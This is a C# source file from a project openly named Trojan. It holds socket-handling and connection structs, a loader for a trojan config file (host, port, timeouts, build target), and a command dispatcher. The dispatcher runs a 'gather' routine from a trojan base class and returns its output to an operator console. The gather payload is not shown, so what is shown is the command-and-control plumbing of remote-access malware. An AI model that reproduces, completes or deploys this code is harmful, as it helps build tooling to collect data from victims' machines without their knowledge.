using System;
using System.Text;
using System.Net;
using System.Net.Sockets;
using Trojan;
using Trojan.exceptions;
using SocketData.operations;

namespace SocketData
{
    public enum ServerStatus
    {
        RUNNING = 0,
        STOPPED = 1,
        IDLE = 2,
        WAITRESPONSE = 3,
        OUTPUTTING = 4,
    }

    public static class CommandExtension
    {
        static List<string> CommandNames = new List<string>
        {
            "gather",
        };

        public static string CheckForCommand(string input)
        {
            string command = input.Split(" ")[1];

            for (int i = 0; i < CommandNames.Count(); i++)
            {
                if (command == CommandNames[i])
                {
                    return(command);
                }
            }

            return ("");
        }

        public static string ExecuteCommand(string CommandName)
        {
            switch(CommandName)
            {
                case("gather"):
                    return(TrojanBaseClass.gather());
                default:
                    return("");
            }
        }
    }

    public class ConnectionManager
    {
        public static List<ConnectionSetup> connections = new List<ConnectionSetup>();
        public static Queue<string> DataQueue = new Queue<string>();
        public static string[]? DataArray = null;

        public static void OutputDataQueue()
        {
            Console.WriteLine("\n\n");
            Console.WriteLine("\r##########################################################################################################################################");
            DataArray = DataQueue.ToArray();
            foreach (string Data in DataArray)
            {
                string message = "{0}";
                Console.WriteLine("\n\n" + message, Data, Encoding.UTF8.GetByteCount(Data));
                //Console.Write("\t" + new string('*', message.Length + Data.Length - 4));
                DataQueue.Dequeue();
            }
            Console.WriteLine("\n\n##########################################################################################################################################");
        }
    }

    public struct ConnectionSetup
    {
        private readonly Socket _s_conn;
        private byte[] _buffer;
        private Task? _ReceiveTask = null;

        public Socket getConn()
        {
            if (_s_conn == null) throw new ExceptionHandler("[-] Connection socket can not be null : " + nameof(_s_conn));
            return(_s_conn);
        }

        public byte[] getBuffer()
        {
            if (_buffer == null) throw new ExceptionHandler("[-] Buffer can not be null : " + nameof(_buffer));
            return(_buffer);
        }

        public void setBuffer(byte[] buffer)
        {
            if (buffer.Length != _buffer.Length) throw new ExceptionHandler("[-] Buffer is not the correct size [1024] : " + nameof(buffer));
            if (buffer == null) throw new ExceptionHandler("[-] Buffer can not be null : " + nameof(buffer));

            _buffer = buffer;
        }

        // this is unsafe as getReceiveTask can return null
        public Task getReceiveTask()
        {
            return(_ReceiveTask);
        }

        public void setReceiveTask(Task task)
        {
            if (task == null) throw new ExceptionHandler("[-] task can not be null : " + nameof(task));

            _ReceiveTask = task;
        }

        public EndPoint getRemoteEndPoint()
        {
            if (_s_conn.RemoteEndPoint == null) throw new ExceptionHandler("[-] RemoteEndPoint can not be null : " + nameof(_s_conn.RemoteEndPoint));
            return _s_conn.RemoteEndPoint;
        }

        public ConnectionSetup(Socket s_conn, byte[] buffer)
        {
            _s_conn = s_conn;
            _buffer = buffer;
        }
    }

    public struct socketSetup
    {
        private string _UUID;

        public string getUUID()
        {
            if (_UUID == null) throw new ExceptionHandler("[-] UUID can not be null : " + nameof(_UUID));
            return _UUID;
        }

        private IPEndPoint? _s_EndPoint = null;

        public void setEndPoint(IPEndPoint s_EndPoint)
        {
            if (s_EndPoint == null) throw new ExceptionHandler("[-] EndPoint can not be null : " + nameof(s_EndPoint));
            _s_EndPoint = s_EndPoint;
        }

        public IPEndPoint getEndPoint()
        {
            if (_s_EndPoint == null) throw new ExceptionHandler("[-] EndPoint not set : " + nameof(_s_EndPoint));
            return _s_EndPoint;
        }

        public Socket? sock = null;

        public readonly ushort port;
        public readonly uint buffSize;

        public byte[] buffer;

        public socketSetup(string UUID, ushort port, uint buffSize)
        {
            _UUID = UUID;

            this.port = port;
            this.buffSize = buffSize;

            buffer = new byte[buffSize];
        }
    }

    public class SocketHandler
    {
        public string TruncationCheckCommand(string command, int startIndex, int length)
        {
            command = command.Substring(startIndex, command.Length - startIndex);
            if (command.Length < length)
            {
                return command;
            }
            return command.Substring(0, length);
        }

        public string RespondToCommand(Socket sock) { return(""); }

        public static IPAddress? HOST = null;
        public static ushort PORT;
        public static uint BUFFSIZE;

        public static ushort MAX_CONNECTIONS;

        public static int CONNECT_TIMEOUT;
        public static int SEND_TIMEOUT;
        public static int RECEIVE_TIMEOUT;
        public static int EVENT_CHECK_INTERVAL;

        public static string? BUILDFOR;

        protected SocketOperations _SocketOperations = new SocketOperations();
        public ServerStatus ServerStatus = ServerStatus.STOPPED;
        public ServerStatus SenderStatus = ServerStatus.IDLE;

        private byte[] buffer = new byte[BUFFSIZE];

        public SocketHandler()
        {
            using (StreamReader ConfigFile = new StreamReader(@"C:\Users\lasse\source\repos\Trojan\trojan-config.cfg"))
            {
                if (ConfigFile == null) throw new ExceptionHandler("Config file not found : " + nameof(ConfigFile));
                string line;
                while ((line = ConfigFile.ReadLine()) != null)
                {
                    string[] LineParts = line.Split(" ");
                    switch (LineParts[0])
                    {
                        case "host":
                            HOST = IPAddress.Parse(LineParts[2]);
                            break;
                        case "port":
                            PORT = ushort.Parse(LineParts[2]);
                            break;
                        case "buffsize":
                            BUFFSIZE = uint.Parse(LineParts[2]);
                            break;
                        case "max_connections":
                            MAX_CONNECTIONS = ushort.Parse(LineParts[2]);
                            break;
                        case "connect_timeout":
                            CONNECT_TIMEOUT = int.Parse(LineParts[2]);
                            break;
                        case "send_timeout":
                            SEND_TIMEOUT = int.Parse(LineParts[2]);
                            break;
                        case "receive_timeout":
                            RECEIVE_TIMEOUT = int.Parse(LineParts[2]);
                            break;
                        case "event_check_interval":
                            EVENT_CHECK_INTERVAL = int.Parse(LineParts[2]);
                            break;
                        case "buildfor":
                            BUILDFOR = LineParts[2];
                            break;
                        default: throw new ExceptionHandler("All values not set in trojan.cfg file : " + nameof(ConfigFile));
                    }
                }
            }
        }
    }
}
